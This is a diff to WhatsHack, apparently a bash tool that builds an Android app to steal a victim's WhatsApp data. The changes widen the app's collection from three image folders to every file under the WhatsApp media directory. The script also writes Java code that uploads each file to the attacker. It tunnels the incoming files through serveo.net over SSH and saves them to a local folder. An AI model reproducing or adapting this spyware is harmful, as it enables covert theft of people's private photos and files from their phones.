@@ -1,6 +1,7 @@
 #!/bin/bash
-# WhatsHack v1.0
+# WhatsHack v1.1
 # Author: @thelinuxchoice (You don't become a coder by just changing the credits)
+# Instagram: @choice_linux
 # Github: https://github.com/thelinuxchoice/whatshack
 
 host="159.89.214.31" #Serveo.net
@@ -41,7 +42,7 @@ printf "\e[1;77m __        ___           _       _   _            _     \n"
 printf " \ \      / / |__   __ _| |_ ___| | | | __ _  ___| | __ \n"
 printf "  \ \ /\ / /| '_ \ / _\` | __/ __| |_| |/ _\` |/ __| |/ / \n"
 printf "   \ V  V / | | | | (_| | |_\__ \  _  | (_| | (__|   <  \n"
-printf "    \_/\_/  |_| |_|\__,_|\__|___/_| |_|\__,_|\___|_|\_\ v1.0\e[0m\n"
+printf "    \_/\_/  |_| |_|\__,_|\__|___/_| |_|\__,_|\___|_|\_\ v1.1\e[0m\n"
 printf "\n"
 printf "     \e[1;92mAuthor: @thelinuxchoice\n\e[0m"
 printf "\n"
@@ -79,7 +80,10 @@ printf "import android.util.Log;\n" >> app/app/src/main/java/com/whatshack/MainA
 printf "import android.view.Menu;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "import android.view.MenuItem;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "import android.widget.Toast;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
+printf "import org.apache.commons.io.FileUtils;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "import org.apache.commons.io.filefilter.TrueFileFilter;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "import java.io.IOException;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "import java.util.List;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "@SuppressLint(\"NewApi\")\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "public class MainActivity extends Activity\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "  {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
@@ -103,58 +107,25 @@ printf "}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 
 printf "public void checkperm() {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "       if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.WRITE_EXTERNAL_STORAGE\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "            String path = \"/storage/emulated/0/WhatsApp/Media/WhatsApp Images/\";\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "            String path2 = \"/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Sent/\";\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "            String path3 = \"/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Private/\";\n" >> app/app/src/main/java/com/whatshack/MainActivity.java           
-printf "   File aDirectory = new File(\"/storage/emulated/0/WhatsApp/Media/WhatsApp Images/\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "   File aDirectorySent = new File(\"/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Sent\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "   File aDirectoryPrivate = new File(\"/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Private\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "    String[] filesInDir = aDirectory.list();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "    String[] filesInDir2 = aDirectorySent.list();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "    String[] filesInDir3 = aDirectoryPrivate.list();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 
- 
- printf "   for ( int i=0; i<filesInDir.length; i++ )\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
- printf "   {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "File dir = new File(\"/storage/emulated/0/WhatsApp/Media/\");\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+
+
+printf "		List<File> files = (List<File>) FileUtils.listFiles(dir,\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "		for (File file : files) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 
 
 printf "try {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "                upload(path+filesInDir[i]);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
- 
-printf "            } catch (Exception e) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
- 
-printf "                e.printStackTrace();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
- 
-printf "            }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-
-printf "    for ( int x=0; x<filesInDir2.length; x++ )\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "    {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-
-printf "try {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "                upload(path2+filesInDir2[x]);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "           } catch (Exception e) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-printf "                e.printStackTrace();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "            String pathW = file.getCanonicalPath();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "                        upload(pathW);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "} catch (Exception e) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 
 printf "            }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "		}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 
-printf "}\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 
-printf "    for ( int z=0; z<filesInDir3.length; z++ )\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "    {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-printf "try {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "                upload(path3+filesInDir3[z]);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "            } catch (Exception e) {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-printf "                e.printStackTrace();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-printf "            }\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-
-printf "}       } else {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "       } else {\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.WRITE_EXTERNAL_STORAGE\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "          checkperm();\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
@@ -240,11 +211,11 @@ createapp
 checkimg() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting WhatsApp Images,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting WhatsApp Files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 if [[ -e Log.log ]]; then
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Image Received!\e[0m\e[1;77m Saved: app/uploadedimages/\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] File Received!\e[0m\e[1;77m Saved: app/uploadedfiles/\e[0m\n"
 rm -rf Log.log
 fi
 done 
@@ -254,6 +225,9 @@ done
 server() {
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 
+if [ ! -d uploadedfiles/ ]; then
+mkdir uploadedfiles/
+fi
 
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink ' &
 
